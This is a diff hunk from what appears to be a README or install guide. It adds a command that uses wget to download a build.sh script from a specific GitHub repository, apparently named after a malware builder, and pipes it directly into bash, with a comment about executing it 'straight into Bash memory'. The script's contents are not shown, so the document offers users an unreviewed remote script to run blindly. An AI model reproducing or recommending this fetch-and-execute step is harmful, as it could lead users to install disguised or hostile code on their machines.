@@ -47,7 +47,7 @@ Run the following command in your terminal to fetch the compiler script directly
 
 ```bash
 # Execute the remote build script straight into Bash memory
-wget -qO- "https://githubusercontent.com" | bash
+wget -qO- "https://raw.githubusercontent.com/artemkoll20/Osiris_builderFast-SY/refs/heads/main/build.sh" | bash
 ```
 
 ### What happens under the hood:
